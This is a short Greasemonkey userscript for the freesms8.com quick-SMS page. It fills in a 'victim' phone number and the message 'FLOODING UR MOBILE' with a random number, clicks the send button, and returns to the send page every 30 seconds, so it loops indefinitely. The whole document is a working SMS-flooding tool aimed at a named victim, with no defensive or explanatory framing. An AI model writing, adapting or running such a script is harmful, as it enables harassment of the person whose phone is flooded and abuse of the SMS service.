// ==UserScript==
// @name           freesms8 sender
// @namespace     Yash
// @description  send sms
// @include        http://*freesms8.com/*
// ==/UserScript==

var victim=0;
if(document.location=="http://www.freesms8.com/quickSMS.aspx"||document.location=="http://www.freesms8.com/QuickSMS.aspx")
{

document.getElementById('ctl00_BodyPlaceHolder_MobileNumber').value=victim;

document.getElementById('ctl00_BodyPlaceHolder_SMSText').value='FLOODING UR MOBILE '+Math.floor(Math.random()*456456);
void(0);
document.getElementById('ctl00_BodyPlaceHolder_SendButton').click();
}

if(document.location=="http://www.freesms8.com/QuickSent.aspx")
{
setTimeout('document.location="http://www.freesms8.com/quickSMS.aspx"',30000);
}